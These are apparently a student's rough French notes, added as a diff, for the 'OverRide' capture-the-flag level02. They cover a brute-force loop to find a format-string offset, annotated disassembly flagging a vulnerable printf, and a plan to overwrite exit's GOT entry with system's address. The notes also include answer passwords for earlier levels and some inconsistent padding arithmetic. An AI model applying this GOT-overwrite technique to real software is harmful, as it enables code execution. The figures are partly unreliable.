@@ -1,0 +1,119 @@
+pour  touver la possition de  un burt force a etait nessaire 
+
+for i in $(seq 1 40); do
+  python2 -c "print('AAAA' + str($i) + ' /%' + str($i) + '\$x')" | ./level02
+done
+
+
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+AAAA 28 /41414141 does not have access!
+
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: AAAA /%28$x
+--[ Password:
+*****************************************
+AAAA /41414141 does not have access!
+
+
+  4009be:       e8 fd fc ff ff          callq  4006c0 <printf@plt>
+  4009c3:       48 8b 05 7e 08 20 00    mov    0x20087e(%rip),%rax        # 601248 <__bss_start>
+  4009ca:       48 89 c2                mov    %rax,%rdx
+  4009cd:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4009d1:       be 64 00 00 00          mov    $0x64,%esi
+  4009d6:       48 89 c7                mov    %rax,%rdi
+  4009d9:       e8 12 fd ff ff          callq  4006f0 <fgets@plt> << porte d entre pour un format string
+  4009de:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4009e2:       be f5 0b 40 00          mov    $0x400bf5,%esi
+  4009e7:       48 89 c7                mov    %rax,%rdi
+  4009ea:       e8 e1 fc ff ff          callq  4006d0 <strcspn@plt>
+  4009ef:       c6 44 05 90 00          movb   $0x0,-0x70(%rbp,%rax,1)
+  4009f4:       b8 e8 0c 40 00          mov    $0x400ce8,%eax
+  4009f9:       48 89 c7                mov    %rax,%rdi
+  4009fc:       b8 00 00 00 00          mov    $0x0,%eax
+  400a01:       e8 ba fc ff ff          callq  4006c0 <printf@plt>
+  400a06:       48 8b 05 3b 08 20 00    mov    0x20083b(%rip),%rax        # 601248 <__bss_start>
+  400a0d:       48 89 c2                mov    %rax,%rdx
+  400a10:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax
+  400a17:       be 64 00 00 00          mov    $0x64,%esi
+  400a1c:       48 89 c7                mov    %rax,%rdi
+  400a1f:       e8 cc fc ff ff          callq  4006f0 <fgets@plt>
+  400a24:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax
+  400a2b:       be f5 0b 40 00          mov    $0x400bf5,%esi
+  400a30:       48 89 c7                mov    %rax,%rdi
+  400a33:       e8 98 fc ff ff          callq  4006d0 <strcspn@plt>
+  400a38:       c6 84 05 f0 fe ff ff    movb   $0x0,-0x110(%rbp,%rax,1)
+  400a3f:       00
+  400a40:       bf f8 0c 40 00          mov    $0x400cf8,%edi
+  400a45:       e8 36 fc ff ff          callq  400680 <puts@plt>
+  400a4a:       48 8d 8d f0 fe ff ff    lea    -0x110(%rbp),%rcx
+  400a51:       48 8d 85 60 ff ff ff    lea    -0xa0(%rbp),%rax
+  400a58:       ba 29 00 00 00          mov    $0x29,%edx
+  400a5d:       48 89 ce                mov    %rcx,%rsi
+  400a60:       48 89 c7                mov    %rax,%rdi
+  400a63:       e8 08 fc ff ff          callq  400670 <strncmp@plt> << appelle  que je voudair  modifier  
+  400a68:       85 c0                   test   %eax,%eax
+  400a6a:       75 2a                   jne    400a96 <main+0x282>
+  400a6c:       b8 22 0d 40 00          mov    $0x400d22,%eax
+  400a71:       48 8d 55 90             lea    -0x70(%rbp),%rdx
+  400a75:       48 89 d6                mov    %rdx,%rsi
+  400a78:       48 89 c7                mov    %rax,%rdi
+  400a7b:       b8 00 00 00 00          mov    $0x0,%eax
+  400a80:       e8 3b fc ff ff          callq  4006c0 <printf@plt>
+  400a85:       bf 32 0d 40 00          mov    $0x400d32,%edi
+  400a8a:       e8 21 fc ff ff          callq  4006b0 <system@plt>
+  400a8f:       b8 00 00 00 00          mov    $0x0,%eax
+  400a94:       c9                      leaveq
+  400a95:       c3                      retq
+  400a96:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  400a9a:       48 89 c7                mov    %rax,%rdi
+  400a9d:       b8 00 00 00 00          mov    $0x0,%eax
+  400aa2:       e8 19 fc ff ff          callq  4006c0 <printf@plt> << printf vunerable 
+
+
+
+  400aa7:       bf 3a 0d 40 00          mov    $0x400d3a,%edi
+  400aac:       e8 cf fb ff ff          callq  400680 <puts@plt> << utiliser veritable cible 
+  400ab1:       bf 01 00 00 00          mov    $0x1,%edi
+  400ab6:       e8 55 fc ff ff          callq  400710 <exit@plt> 
+
+
+    00000000006011f8 R_X86_64_JUMP_SLOT  system
+
+    0000000000601228 R_X86_64_JUMP_SLOT  exit
+
+attaque sur  exit 
+
+addr base : 0x601228
+addr haut : 0x60122a
+
+valeur systeme  400a8a:       e8 21 fc ff ff          callq  4006b0 <system@plt>
+
+on va  utiliser le pointeur  de l'appel de la function de  system 4006b0
+
+on divise en deux   4006 06b0 car que l'écriture se fait en "little endian" sur 64 bits.
+
+base addr  4006 : 16390
+haut addr  06b0 : 1712
+
+16 390 - 1712 = 15 678 - 28 = 15 650
+
+pad1 = val1 - 16          # 1712 - 16 = 1696
+pad2 = (val2 - val1) % 65536  # (16390 - 1712) = 14678
+
+pass level 0 : uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL = 40
+pass level 1 : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv = 40
+
+pass level 2 : ? = 40 
+
+
+for i in $(seq 20 28); do
+> python -c "print 'AAAA' + ' %${i}\$p'" | ./level02
+> done
